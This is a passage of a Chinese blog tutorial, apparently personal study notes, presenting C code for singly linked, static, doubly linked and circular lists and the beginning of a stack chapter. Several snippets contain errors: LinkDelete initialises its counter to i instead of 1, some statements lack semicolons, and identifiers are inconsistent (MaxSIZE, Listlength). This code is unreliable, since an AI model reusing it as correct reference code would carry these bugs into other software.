<span class="title">GetElem</span><span class="params">(LinkList L, <span class="keyword">int</span> i, ElemType* e)</span> <span class="comment">//用e返回L中第i个数据元素的值</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line">LinkList p;   <span class="comment">//声明指针p</span></span><br><span class="line">p = L-&gt;next;  <span class="comment">//p指向链表L的第一个节点</span></span><br><span class="line">j = <span class="number">1</span>;    <span class="comment">//j为计数器</span></span><br><span class="line"><span class="keyword">while</span> (p &amp;&amp; j &lt; i) <span class="comment">//p不为空且计数器j还没有等于i时，循环继续</span></span><br><span class="line">{</span><br><span class="line">p = p-&gt;next; <span class="comment">//p指向下一个节点</span></span><br><span class="line">++j;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (!p || j &gt; i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//第i个节点不存在</span></span><br><span class="line">}</span><br><span class="line">*e = p-&gt;data;  <span class="comment">//取第i个节点的数据</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="单链表的插入"><a href="#单链表的插入" class="headerlink" title="单链表的插入"></a>单链表的插入</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListInsert</span><span class="params">(LinkList* L, <span class="keyword">int</span> i, ElemType e)</span> <span class="comment">//在L的第i个节点之前插入元素e，L的长度加1</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line">LinkList p,s;</span><br><span class="line">p = *L;</span><br><span class="line">j = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (p &amp;&amp; j &lt; i) <span class="comment">//寻找第i-1个节点</span></span><br><span class="line">{</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">++j;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (!p || j &lt; i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//第i个节点不存在</span></span><br><span class="line">}</span><br><span class="line">s = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node)); <span class="comment">//生成新节点</span></span><br><span class="line">s-&gt;data = e;</span><br><span class="line">s-&gt;next = p-&gt;next;  <span class="comment">//将p的后继节点赋值给s的后继</span></span><br><span class="line">p-&gt;next = s;  <span class="comment">//将s赋值给p的后继</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="单链表的删除"><a href="#单链表的删除" class="headerlink" title="单链表的删除"></a>单链表的删除</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LinkDelete</span><span class="params">(LinkList* L, <span class="keyword">int</span> i, ElemType* e)</span> <span class="comment">//删除L中的第i个节点，并用e返回其值，L的长度减1</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line">LinkList p, q;</span><br><span class="line">p = *L;</span><br><span class="line">j = i;</span><br><span class="line"><span class="keyword">while</span> (p-&gt;next &amp;&amp; j &lt; i) <span class="comment">//遍历寻找第i-1个节点</span></span><br><span class="line">{</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">++j;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;next) || j &gt; i)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//第i个节点不存在</span></span><br><span class="line">}</span><br><span class="line">q = p-&gt;next;</span><br><span class="line">p-&gt;next = q-&gt;next; <span class="comment">//将q的后继赋值给p的后继</span></span><br><span class="line">*e = q-&gt;data;   <span class="comment">//将q节点中的数据给e</span></span><br><span class="line"><span class="built_in">free</span>(q);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="单链表的整表创建"><a href="#单链表的整表创建" class="headerlink" title="单链表的整表创建"></a>单链表的整表创建</h4><h5 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateListHead</span><span class="params">(LinkList* L, <span class="keyword">int</span> n)</span> <span class="comment">//随机产生n个元素的值，建立带表头节点的单链线性表L（头插法）</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkList p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">srand(time(<span class="number">0</span>));  <span class="comment">//初始化随机种子</span></span><br><span class="line">*L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">(*L)-&gt;next = <span class="literal">NULL</span>;   <span class="comment">//先建立一个带头结点的单链表</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">{</span><br><span class="line">p = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node)); <span class="comment">//生成新节点</span></span><br><span class="line">p-&gt;data = rand() % <span class="number">100</span> + <span class="number">1</span>;  <span class="comment">//随机生成100以内的数字</span></span><br><span class="line">p-&gt;next = (*L)-&gt;next;</span><br><span class="line">(*L)-&gt;next = p;   <span class="comment">//插入到表头</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateListTail</span><span class="params">(LinkList* L, <span class="keyword">int</span> n)</span><span class="comment">//随机产生n个元素的值，建立带表头节点的单链线性表L（尾插法）</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkList p, r;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">srand(time(<span class="number">0</span>));</span><br><span class="line">*L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">r = *L;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">{</span><br><span class="line">p = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));  <span class="comment">//生成新节点</span></span><br><span class="line">p-&gt;data = rand() % <span class="number">100</span> + <span class="number">1</span>;</span><br><span class="line">r-&gt;next = p;  <span class="comment">//将表尾终端节点的指针指向新节点</span></span><br><span class="line">r = p;  <span class="comment">//将当前的新节点定义为表尾终端节点</span></span><br><span class="line">}</span><br><span class="line">r-&gt;next = <span class="literal">NULL</span>;  <span class="comment">//表示当前链表结束</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="清空链表"><a href="#清空链表" class="headerlink" title="清空链表"></a>清空链表</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ClearList</span><span class="params">(LinkList* L)</span> <span class="comment">//单链表的整表删除，将L置为空表</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">LinkList p, q;</span><br><span class="line">p = (*L)-&gt;next; <span class="comment">//p指向第一个节点</span></span><br><span class="line"><span class="keyword">while</span> (p)  <span class="comment">//没到表尾</span></span><br><span class="line">{</span><br><span class="line">q = p-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">p = q;</span><br><span class="line">}</span><br><span class="line">(*L)-&gt;next = <span class="literal">NULL</span>;  <span class="comment">//头结点指针域为空</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="单链表结构与顺序存储结构优缺点"><a href="#单链表结构与顺序存储结构优缺点" class="headerlink" title="单链表结构与顺序存储结构优缺点"></a>单链表结构与顺序存储结构优缺点</h4><p><strong><em>1、存储分配方式</em></strong></p><p>​        <strong><em>①顺序存储结构一般用一段连续的存储单元依次存储线性表的数据元素</em></strong></p><p>​        <strong><em>②单链表采用链式存储结构，用一组任意的存储大单元存放线性表的元素</em></strong></p><p><strong><em>2、时间性能</em></strong></p><p><strong><em>①查找</em></strong></p><p><strong><em>ⅰ顺序存储结构O(1)</em></strong></p><p><strong><em>ⅱ单链表O(n)</em></strong></p><p><strong><em>②插入和删除</em></strong></p><p>​        <strong><em>ⅰ顺序存储结构需要平均移动表长一半的元素，时间为o(n)</em></strong></p><p>​        <strong><em>ⅱ单链表在线出某位置的指针后，插入和删除时间仅为o(1)</em></strong></p><p><strong><em>③空间性能</em></strong></p><p>​        <strong><em>ⅰ顺序存储结构需要预分配存储空间，分大了，浪费，分小了，易发生上溢</em></strong></p><p>​        <strong><em>ⅱ单链表不需要分配存储空间，只要有就可以分配，元素个数也不受限制</em></strong></p><h2 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h2><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>用数组描述的链表叫做静态链表 ；</p><p>具体描述：首先让数组的两个元素都是由两个数据域组成，data和cur；也就是说，数组的每个下标都对应一个</p><p>data和cur；数据域data，用来存放数据元素,也就是通常我们要处理的数据；而cur相当于链表中的next指针，存</p><p>放该元素的后继在数组中的下标，我们把cur叫做游标；</p><p>小注：这里我理解的游标就是next那根链，元素的游标指向下一个数值的下标；;</p><h3 id="静态链表存储结构"><a href="#静态链表存储结构" class="headerlink" title="静态链表存储结构"></a>静态链表存储结构</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000 <span class="comment">// 假设链表最大长度是1k</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="keyword">int</span> cur; <span class="comment">//游标，为0时表示无指向</span></span><br><span class="line">}StaticLinkList[MAXSIZE];</span><br></pre></td></tr></tbody></table></figure><h3 id="初始化数组"><a href="#初始化数组" class="headerlink" title="初始化数组"></a>初始化数组</h3><p>0-998游标从1-999，最后一个游标为0</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InitLink</span><span class="params">(StaticLinkList space)</span> <span class="comment">//将一位数组space中各分量链成一备用链表，space[0].cur为头指针，"0"表示空指针</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXSIZE - <span class="number">1</span>; i++)</span><br><span class="line">{</span><br><span class="line">space[i].cur = i + <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">space[MAXSIZE - <span class="number">1</span>].cur = <span class="number">0</span>; <span class="comment">//目前静态链表为空，最后一个元素的cur为0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>注：</p><p>​    我们通常把未使用的数组元素成为备用链表；</p><p>​    数组的第一个元素，即下标为0的那个元素的cur就存放备用链表的第一个节点的下标；</p><p>​    数组的最后一个元素，即下标为MAXSIZE-1的cur则存放第一个有数值的元素的下标，相当于头节点的作用；</p><h3 id="获取链表中元素的个数"><a href="#获取链表中元素的个数" class="headerlink" title="获取链表中元素的个数"></a>获取链表中元素的个数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListLength</span><span class="params">(StaticLinkList L)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i = L[MAXSIZE - <span class="number">1</span>].cur; <span class="comment">//最后一个元素的游标，从头循环计数</span></span><br><span class="line"><span class="keyword">while</span> (i) <span class="comment">//循环计数，找到空闲分量即停止循环</span></span><br><span class="line">{</span><br><span class="line">i = L[i].cur; </span><br><span class="line">j++;  <span class="comment">//计数</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> j;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="静态链表的插入操作"><a href="#静态链表的插入操作" class="headerlink" title="静态链表的插入操作"></a>静态链表的插入操作</h3><h4 id="获得空闲分量的下标"><a href="#获得空闲分量的下标" class="headerlink" title="获得空闲分量的下标"></a>获得空闲分量的下标</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Malloc_SSL</span><span class="params">(StaticLinkList space)</span> <span class="comment">//若备用空间链表为空，则返回分配的节点下标，否则返回0</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = space[<span class="number">0</span>].cur; <span class="comment">//当前数组第一个元素cur存的值，就是要返回的第一个备用空闲的下标</span></span><br><span class="line"><span class="keyword">if</span> (space[<span class="number">0</span>].cur)</span><br><span class="line">{</span><br><span class="line">space[<span class="number">0</span>].cur = space[i].cur; <span class="comment">// 由于要拿出一个分量来使用，所以我们就得把它的下一个分量用来做备用</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListInsert</span><span class="params">(StaticLinkList L, <span class="keyword">int</span> i, ElemType e)</span> <span class="comment">// 在L中第i个元素之前插入新的数据元素e</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j, k, l;</span><br><span class="line">k = MAXSIZE - <span class="number">1</span>;  <span class="comment">//k是最后一个元素的下标</span></span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;Listlength(L) + <span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">j = Malloc_SSL(L);  <span class="comment">//获得空闲分量的下标</span></span><br><span class="line"><span class="keyword">if</span> (j)</span><br><span class="line">{</span><br><span class="line">L[j].data = e; <span class="comment">//将数值赋值给此分量的data</span></span><br><span class="line"><span class="keyword">for</span> (l = <span class="number">1</span>; l &lt;= i - <span class="number">1</span>; l++)  <span class="comment">//找到第i个元素之前的位置</span></span><br><span class="line">{</span><br><span class="line">k = L[k].cur;</span><br><span class="line">}</span><br><span class="line">L[j].cur = L[k].cur;  <span class="comment">//把第i个元素之前的cur赋值给新元素的cur</span></span><br><span class="line">L[k].cur = j;  <span class="comment">//把新元素的下标赋值给第i个元素之前元素的cur</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="静态链表的删除操作"><a href="#静态链表的删除操作" class="headerlink" title="静态链表的删除操作"></a>静态链表的删除操作</h3><h4 id="回收节点"><a href="#回收节点" class="headerlink" title="回收节点"></a>回收节点</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free_SSL</span><span class="params">(StaticLinkList space,<span class="keyword">int</span> k)</span><span class="comment">//将下标为k的空闲节点回收到备用链表</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">space[k].cur = space[<span class="number">0</span>].cur; <span class="comment">//把第一个元素cur值赋给要删除的分量cur</span></span><br><span class="line">space[<span class="number">0</span>].cur = k; <span class="comment">//把要删除的分量下标赋给第一个元素的cur</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListDelete</span><span class="params">(StaticLinkList L, <span class="keyword">int</span> i)</span> <span class="comment">// 删除L中第i个元素e</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> j, k;</span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;ListLength(L))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">}</span><br><span class="line">k = MAXSIZE - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= i - <span class="number">1</span>; j++)</span><br><span class="line">{</span><br><span class="line">k = L[k].cur;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// j &gt; k</span></span><br><span class="line">j = L[k].cur;  <span class="comment">//L[k].cur指向删除元素的下标，赋值给j</span></span><br><span class="line">L[k].cur = L[j].cur;  <span class="comment">//被删除元素的游标赋值给前一个元素的游标，实现连接</span></span><br><span class="line">Free_SSL(L, j); <span class="comment">//回收</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="静态链表优缺点"><a href="#静态链表优缺点" class="headerlink" title="静态链表优缺点"></a>静态链表优缺点</h3><p><strong><em>1、优点：</em></strong></p><p>​        <strong><em>●在插入和删除操作时，只需要修改游标，不需要移动元素，从而改进了在顺序存储结构中的插入和删除操作</em></strong></p><p><strong><em>需要移动大量元素的缺点</em></strong></p><p><strong><em>2、缺点：</em></strong></p><p>​        <strong><em>●没有解决连续存储分配带来的表长难以确定的问题</em></strong></p><p>​        <strong><em>●失去了顺序存储结构随机存取的特性</em></strong></p><h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><h3 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h3><p>双向链表是在单链表的每个节点中，再设置一个指向其前驱节点的指针域，前驱后继方向都能遍历；</p><h3 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DulNode</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DulNode</span>* <span class="title">prior</span>;</span>  <span class="comment">//直接前驱指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DulNode</span>* <span class="title">next</span>;</span>  <span class="comment">//直接后继指针</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>显然，与单链表相比，多了一个直接前驱；</p><h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><h3 id="定义-4"><a href="#定义-4" class="headerlink" title="定义"></a>定义</h3><p>循环链表——首尾相连的链表；</p><p>将单链表中终端节点的指针端由空指针改为指向头节点，就使整个单链表形成一个环。这种头尾相接的单链表称为</p><p>单循环链表，简称循环链表；</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>循环链表中，从任一节点出发都可以访问到表中所有节点，在单链表中，必须从头指针开始，否则无法访问到该节</p><p>点之前的其他节点；</p><p>循环链表好像用处不太大，就不多说了；</p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>这一章节是线性表，线性表对于以后学习的数据结构会有很大作用；选择使用哪种线性表，结合情况再定，各有利</p><p>弊；   // 下一章学习栈，不见不散；</p><p>Bye~~</p><h1 id="栈—Stack"><a href="#栈—Stack" class="headerlink" title="栈—Stack"></a><u>栈</u>—Stack</h1><p>线性表总的来说是挺简单的（和链表差不多），学好线性表才可以继续学习哦~</p><p>下面我们开始学习栈</p><h2 id="定义-5"><a href="#定义-5" class="headerlink" title="定义"></a>定义</h2><p><u><strong><em>栈是限定仅在表尾进行插入和删除操作的线性表；</em></strong></u></p><p>允许插入和删除的一端称为栈顶，另一端称为栈底，不含任何数据元素的栈称为空栈，栈又称为后进先出线性表，</p><p>简称LIFO结构；</p><h2 id="栈的抽象数据类型——基本操作-入栈-出栈"><a href="#栈的抽象数据类型——基本操作-入栈-出栈" class="headerlink" title="栈的抽象数据类型——基本操作( 入栈 出栈 )"></a>栈的抽象数据类型——基本操作( 入栈 出栈 )</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、InitStack(*S) <span class="comment">//初始化操作，建立一个空栈</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、DestroyStack(*S) <span class="comment">//若栈存在，则销毁它</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、ClearStack(*S) <span class="comment">//将栈清空</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、StackEmpty(*S) <span class="comment">//若栈为空，返回true，否则返回false</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、GetTop(S, *e) <span class="comment">//若栈存在且非空，用e返回S的栈顶元素</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、Push(*S, e) <span class="comment">//若栈S存在，插入新元素e到栈S中并成为栈顶元素</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、Pop(*S, *e) <span class="comment">//删除栈S中栈顶元素，并用e返回其值</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、StackLength(S) <span class="comment">//返回栈S的元素个数</span></span><br></pre></td></tr></tbody></table></figure><h2 id="栈的顺序存储结构"><a href="#栈的顺序存储结构" class="headerlink" title="栈的顺序存储结构"></a>栈的顺序存储结构</h2><h3 id="结构代码"><a href="#结构代码" class="headerlink" title="结构代码"></a>结构代码</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 1000</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data[MAXSIZE]; <span class="comment">//栈的元素最大个数</span></span><br><span class="line"><span class="keyword">int</span> top; <span class="comment">//用于栈顶指针</span></span><br><span class="line">}SqStack;</span><br></pre></td></tr></tbody></table></figure><h3 id="初始化栈"><a href="#初始化栈" class="headerlink" title="初始化栈"></a>初始化栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitStack</span><span class="params">(SqStack* S)</span> <span class="comment">//初始化栈</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">S-&gt;top = <span class="number">-1</span>; <span class="comment">//初始化栈为空</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="判断栈是否已满"><a href="#判断栈是否已满" class="headerlink" title="判断栈是否已满"></a>判断栈是否已满</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackFull</span><span class="params">(SqStack* S)</span> <span class="comment">//判断栈是否已满</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (S-&gt;top == MaxSIZE - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="判断栈是否为空"><a href="#判断栈是否为空" class="headerlink" title="判断栈是否为空"></a>判断栈是否为空</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackEmpty</span><span class="params">(SqStack* S)</span> <span class="comment">//判断栈是否为空</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (S-&gt;top == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="进栈"><a href="#进栈" class="headerlink" title="进栈"></a>进栈</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span 